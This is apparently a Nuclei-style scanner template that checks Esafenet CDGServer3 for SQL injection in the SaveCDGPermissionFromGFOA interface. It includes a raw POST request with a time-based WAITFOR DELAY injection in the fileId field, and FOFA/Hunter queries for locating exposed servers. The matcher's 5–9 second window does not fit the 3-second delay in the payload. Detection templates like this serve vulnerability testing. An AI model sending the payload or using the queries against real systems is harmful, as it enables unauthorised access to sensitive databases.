id: esafenet-cdgserver3-SaveCDGPermissionFromGFOA-sqli

info:
  name: 亿赛通电子文档安全管理系统 SaveCDGPermissionFromGFOA - sqli
  author: leadlife
  severity: high
  description: 亿赛通电子文档安全管理系统 SaveCDGPermissionFromGFOA 接口存在 SQL 注入漏洞，由于 fileID 对传入的数据没有预编译和充足的校验，导致未授权的攻击者可获取数据库敏感信息。
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
    hunter-query: app.name="ESAFENET 亿赛通文档安全管理系统"
  tags: esafenet,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /CDGServer3/js/../SaveCDGPermissionFromGFOA HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Content-Length: 39
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        
        fileId=1';WAITFOR DELAY '0:0:3'--&pis=1

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
          - status_code == 200
          - contains_all(header, "CDGServer3")
        condition: and
